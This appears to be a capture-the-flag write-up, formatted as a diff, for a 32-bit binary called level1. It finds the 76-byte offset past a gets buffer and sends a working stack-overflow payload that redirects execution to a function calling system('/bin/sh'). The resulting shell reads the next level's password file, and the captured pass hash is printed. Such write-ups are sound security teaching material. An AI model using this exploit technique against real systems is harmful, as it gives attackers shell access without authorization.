@@ -1,0 +1,54 @@
+$ gdb ./level1
+
+(gdb) disas main
+
+we have nothing but a cal to gets
+we try to segfault the program
+
+$ python -c 'print ("A"*999)' | ./level1
+segfault
+
+so we look for the offset of the position after the buffer that hold gets result
+
+$ python -c 'print ("A"*100)' | ./level1
+segfault
+$ python -c 'print ("A"*50)' | ./level1
+$ python -c 'print ("A"*75)' | ./level1
+$ python -c 'print ("A"*76)' | ./level1
+segfault
+
+$ gdb ./level1
+
+(gdb) info funtions
+...
+0x08048444  run
+0x08048480  main
+...
+
+there is a function run
+
+(gdb) disas run
+   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
+   0x08048472 <+46>:    movl   $0x8048584,(%esp)
+   0x08048479 <+53>:    call   0x8048360 <system@plt>
+
+there is a call to system("/bin/sh")
+
+so we will overwrite the instruction register by the address of the function run
+use [::-1] to reverse the address to little endian
+
+
+$ python -c 'print("A"*76+"\x08\x04\x84\x44[::-1]")' | ./level1
+Good... Wait what?
+Segmentation fault (core dumped)
+
+the function run is called but it close and we are not able to input commands
+we use cat to keep the buffer open for input and avoid the program from exiting
+
+$ (python -c 'print("A"*76+"\x08\x04\x84\x44"[::-1])' ;cat ) | ./level1
+Good... Wait what?
+cd ../level2 && cat .pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+
+
